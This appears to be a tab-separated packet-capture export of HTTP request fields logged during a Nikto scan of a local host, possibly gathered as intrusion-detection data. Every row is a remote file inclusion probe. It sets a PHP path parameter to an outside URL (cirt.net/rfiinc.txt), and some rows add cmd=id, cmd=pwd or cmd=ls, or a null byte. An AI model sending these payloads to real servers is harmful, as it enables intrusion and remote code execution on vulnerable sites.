http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									6462						1	http://192.168.1.101/web/akarru.gui/main_content.php?bm_content=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004235)				/web/akarru.gui/main_content.php?bm_content=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6469						1	http://192.168.1.101/web/akocomments.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004236)				/web/akocomments.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6477						1	http://192.168.1.101/web/amazon/cart.php?cmd=add&asin=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004237)				/web/amazon/cart.php?cmd=add&asin=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6486						1	http://192.168.1.101/web/amazon/index.php?lang=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004238)				/web/amazon/index.php?lang=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6493						1	http://192.168.1.101/web/amazon/info.php?asin=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004239)				/web/amazon/info.php?asin=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6494						1	http://192.168.1.101/web/annonce.php?page=http://cirt.net/rfiinc.txt??&cmd=id		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004240)				/web/annonce.php?page=http://cirt.net/rfiinc.txt??&cmd=id
																	Keep-Alive										192.168.1.101									6502						1	http://192.168.1.101/web/announcements.php?phpraid_dir=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004241)				/web/announcements.php?phpraid_dir=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6508						1	http://192.168.1.101/web/anzagien.php?config[root_ordner]=http://cirt.net/rfiinc.txt??cmd=id		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004242)				/web/anzagien.php?config[root_ordner]=http://cirt.net/rfiinc.txt??cmd=id
																	Keep-Alive										192.168.1.101									6514						1	http://192.168.1.101/web/apbn/templates/head.php?APB_SETTINGS[template_path]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004243)				/web/apbn/templates/head.php?APB_SETTINGS[template_path]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6521						1	http://192.168.1.101/web/api.php?t_path_core=http://cirt.net/rfiinc.txt??&cmd=id		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004244)				/web/api.php?t_path_core=http://cirt.net/rfiinc.txt??&cmd=id
																	Keep-Alive										192.168.1.101									6528						1	http://192.168.1.101/web/apps/apps.php?app=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004245)				/web/apps/apps.php?app=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6535						1	http://192.168.1.101/web/appserv/main.php?appserv_root=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004246)				/web/appserv/main.php?appserv_root=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6543						1	http://192.168.1.101/web/arab3upload/customize.php?path=http://cirt.net/rfiinc.txt??&cmd=pwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004247)				/web/arab3upload/customize.php?path=http://cirt.net/rfiinc.txt??&cmd=pwd
																	Keep-Alive										192.168.1.101									6549						1	http://192.168.1.101/web/arab3upload/initialize.php?path=http://cirt.net/rfiinc.txt??&cmd=pwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004248)				/web/arab3upload/initialize.php?path=http://cirt.net/rfiinc.txt??&cmd=pwd
																	Keep-Alive										192.168.1.101									6556						1	http://192.168.1.101/web/arash_lib/class/arash_gadmin.class.php?arashlib_dir=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004249)				/web/arash_lib/class/arash_gadmin.class.php?arashlib_dir=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6562						1	http://192.168.1.101/web/arash_lib/class/arash_sadmin.class.php?arashlib_dir=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004250)				/web/arash_lib/class/arash_sadmin.class.php?arashlib_dir=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6570						1	http://192.168.1.101/web/arash_lib/include/edit.inc.php?arashlib_dir=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004251)				/web/arash_lib/include/edit.inc.php?arashlib_dir=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6578						1	http://192.168.1.101/web/arash_lib/include/list_features.inc.php?arashlib_dir=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004252)				/web/arash_lib/include/list_features.inc.php?arashlib_dir=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6586						1	http://192.168.1.101/web/archive.php?scriptpath=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004253)				/web/archive.php?scriptpath=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									6593						1	http://192.168.1.101/web/aroundme/template/barnraiser_01/pol_view.tpl.php?poll=1&templatePath=http://cirt.net/rfiinc.txt?%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004254)				/web/aroundme/template/barnraiser_01/pol_view.tpl.php?poll=1&templatePath=http://cirt.net/rfiinc.txt?%00
																	Keep-Alive										192.168.1.101									6600						1	http://192.168.1.101/web/artlist.php?root_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004255)				/web/artlist.php?root_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6607						1	http://192.168.1.101/web/assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=http://cirt.net/rfiinc.txt??cmd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004256)				/web/assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=http://cirt.net/rfiinc.txt??cmd
																	Keep-Alive										192.168.1.101									6614						1	http://192.168.1.101/web/assets/snippets/reflect/snippet.reflect.php?reflect_base=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004257)				/web/assets/snippets/reflect/snippet.reflect.php?reflect_base=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									6620						1	http://192.168.1.101/web/athena.php?athena_dir=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004258)				/web/athena.php?athena_dir=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6627						1	http://192.168.1.101/web/auction/auction_common.php?phpbb_root_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004259)				/web/auction/auction_common.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6634						1	http://192.168.1.101/web/auction/includes/converter.inc.php?include_path=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004260)				/web/auction/includes/converter.inc.php?include_path=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									6641						1	http://192.168.1.101/web/auction/includes/messages.inc.php?include_path=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004261)				/web/auction/includes/messages.inc.php?include_path=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									6649						1	http://192.168.1.101/web/auction/includes/settings.inc.php?include_path=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004262)				/web/auction/includes/settings.inc.php?include_path=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									6656						1	http://192.168.1.101/web/auction/phpAdsNew/view.inc.php?phpAds_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004263)				/web/auction/phpAdsNew/view.inc.php?phpAds_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6663						1	http://192.168.1.101/web/auth.cookie.inc.php?da_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004264)				/web/auth.cookie.inc.php?da_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6672						1	http://192.168.1.101/web/auth.header.inc.php?da_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004265)				/web/auth.header.inc.php?da_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6679						1	http://192.168.1.101/web/auth.sessions.inc.php?da_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004266)				/web/auth.sessions.inc.php?da_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6687						1	http://192.168.1.101/web/auth/auth.php?phpbb_root_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004267)				/web/auth/auth.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6693						1	http://192.168.1.101/web/auth/auth_phpbb/phpbb_root_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004268)				/web/auth/auth_phpbb/phpbb_root_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6699						1	http://192.168.1.101/web/authenticate.php?default_path_for_themes=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004269)				/web/authenticate.php?default_path_for_themes=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									6700						1	http://192.168.1.101/web/authentication/phpbb3/phpbb3.functions.php?pConfig_auth[phpbb_path]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004270)				/web/authentication/phpbb3/phpbb3.functions.php?pConfig_auth[phpbb_path]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6707						1	http://192.168.1.101/web/authentication/smf/smf.functions.php?pConfig_auth[smf_path]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004271)				/web/authentication/smf/smf.functions.php?pConfig_auth[smf_path]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6713						1	http://192.168.1.101/web/auto_check_renewals.php?installed_config_file=http://cirt.net/rfiinc.txt??cmd=ls		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004272)				/web/auto_check_renewals.php?installed_config_file=http://cirt.net/rfiinc.txt??cmd=ls
																	Keep-Alive										192.168.1.101									6719						1	http://192.168.1.101/web/autoindex.php?cfg_file=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004273)				/web/autoindex.php?cfg_file=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									6727						1	http://192.168.1.101/web/awzmb/adminhelp.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004274)				/web/awzmb/adminhelp.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6733						1	http://192.168.1.101/web/awzmb/modules/admin.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004275)				/web/awzmb/modules/admin.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6741						1	http://192.168.1.101/web/awzmb/modules/core/core.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004276)				/web/awzmb/modules/core/core.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6749						1	http://192.168.1.101/web/awzmb/modules/gbook.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004277)				/web/awzmb/modules/gbook.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6756						1	http://192.168.1.101/web/awzmb/modules/help.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004278)				/web/awzmb/modules/help.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6763						1	http://192.168.1.101/web/awzmb/modules/reg.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004279)				/web/awzmb/modules/reg.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6770						1	http://192.168.1.101/web/axoverzicht.cgi?maand=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004280)				/web/axoverzicht.cgi?maand=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6777						1	http://192.168.1.101/web/b2-tools/gm-2-b2.php?b2inc=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004281)				/web/b2-tools/gm-2-b2.php?b2inc=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6783						1	http://192.168.1.101/web/b2verifauth.php?index=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004282)				/web/b2verifauth.php?index=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.101									6790						1	http://192.168.1.101/web/backend/addons/links/index.php?PATH=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004283)				/web/backend/addons/links/index.php?PATH=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6796						1	http://192.168.1.101/web/basebuilder/src/main.inc.php?mj_config[src_path]=http://cirt.net/rfiinc.txt????		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004284)				/web/basebuilder/src/main.inc.php?mj_config[src_path]=http://cirt.net/rfiinc.txt????
																	Keep-Alive										192.168.1.101									6797						1	http://192.168.1.101/web/bb_admin.php?includeFooter=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004285)				/web/bb_admin.php?includeFooter=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.101									6804						1	http://192.168.1.101/web/beacon/language/1/splash.lang.php?languagePath=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004286)				/web/beacon/language/1/splash.lang.php?languagePath=http://cirt.net/rfiinc.txt?
